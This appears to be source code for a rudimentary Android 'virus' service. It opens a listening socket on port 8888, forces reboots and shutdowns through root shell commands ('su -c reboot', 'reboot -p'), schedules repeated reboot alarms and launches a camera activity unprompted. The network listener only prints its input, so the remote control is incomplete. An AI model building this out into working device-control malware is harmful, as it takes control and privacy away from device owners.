package com.example.virus;

import java.io.BufferedWriter;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.net.ServerSocket;
import java.net.Socket;

import com.example.virus.Util.CommandType;


import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Binder;
import android.os.IBinder;
import android.telephony.SmsManager;
import android.util.Log;

public class BackgroudService extends Service{

	public static final String ALARM_REBOOT_ACTION = "reboot.alarm.action";
	
	private String mIpAddress;
	private ServerThread mServerThread = null;
	private BackgroundBinder mBinder = new BackgroundBinder();
	
	@Override
	public void onCreate() {     
        super.onCreate();   
        mIpAddress = Util.getHostIp(this);
        mServerThread = new ServerThread();
        mServerThread.start();
        Log.d("MyService", "onCreate()");   
    }
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
        if (mServerThread == null) {
        	mServerThread = new ServerThread();
        	mServerThread.start();
        }
        this.registerReceiver(receiver, new IntentFilter(ALARM_REBOOT_ACTION));
		return super.onStartCommand(intent, flags, startId);
	}

	@Override
	public void onDestroy() {
		this.unregisterReceiver(receiver);
		super.onDestroy();
	}

	private void execute(CommandType type) {
		switch (type) {
		case REBOOT:
			try {
				Runtime.getRuntime().exec("su -c reboot");
			} catch (IOException e) {
				e.printStackTrace();
			}
			break;
		case ALARM_REBOOT:
			final int RTIME = 5 * 60 * 10;
			AlarmManager am = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
			Intent intent = new Intent();
			intent.setAction(ALARM_REBOOT_ACTION);
			PendingIntent pi = PendingIntent.getBroadcast(this, 0, intent, PendingIntent.FLAG_UPDATE_CURRENT);
			Log.d("reboot", "before");
			am.set(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() + RTIME, pi);
			break;
		case SHUTDOWN:
			try {
				ProcessBuilder pb = new ProcessBuilder("/system/bin/sh");
				pb.directory(new File("/"));
				Process proc = pb.start();
				PrintWriter out = new PrintWriter(new BufferedWriter(new OutputStreamWriter(proc.getOutputStream())), true); 
				out.println("su");
				Thread.sleep(1000);
				out.println("reboot -p");
				out.close();
				proc.destroy();
			} catch (IOException e) {
				e.printStackTrace();
			} catch (InterruptedException e) {
				e.printStackTrace();
			}
			break;
		case LAUNCH_CAMERA:
			Intent i = new Intent();
			i.setClass(this, CameraActivity.class);
			i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			startActivity(i);
			break;
		default:
			break;
		}
	}
	
	@Override
	public IBinder onBind(Intent intent) {
		Log.d("MyService", "onBind()");  
		return mBinder;
	}    
	
	class ServerThread extends Thread{  
        public void run(){ 
            ServerSocket serverSocket = null; 
            try { 
                serverSocket = new ServerSocket(8888); 
                Socket socket = serverSocket.accept(); 
                InputStream inputStream = socket.getInputStream(); 
                byte buffer [] = new byte[1024*4]; 
                int temp = 0; 
                while((temp = inputStream.read(buffer)) != -1){ 
                    System.out.println(new String(buffer,0,temp)); 
                } 
                
            } catch (IOException e) { 
                e.printStackTrace(); 
            } finally{ 
                try { 
                    serverSocket.close(); 
                } catch (IOException e) { 
                    e.printStackTrace(); 
                } 
            } 
         
        } 
	}

	class BackgroundBinder extends Binder {
		public void executeCommand(CommandType type) {
			execute(type);
		}
	}
	private BroadcastReceiver receiver = new BroadcastReceiver() {

		@Override
		public void onReceive(Context context, Intent intent) {
			Log.d("reboot", "handle after");
			execute(CommandType.REBOOT);
//			try {
//				Runtime.getRuntime().exec("su -c reboot");
//			} catch (IOException e) {
//				e.printStackTrace();
//			}
		}
		
	};
}
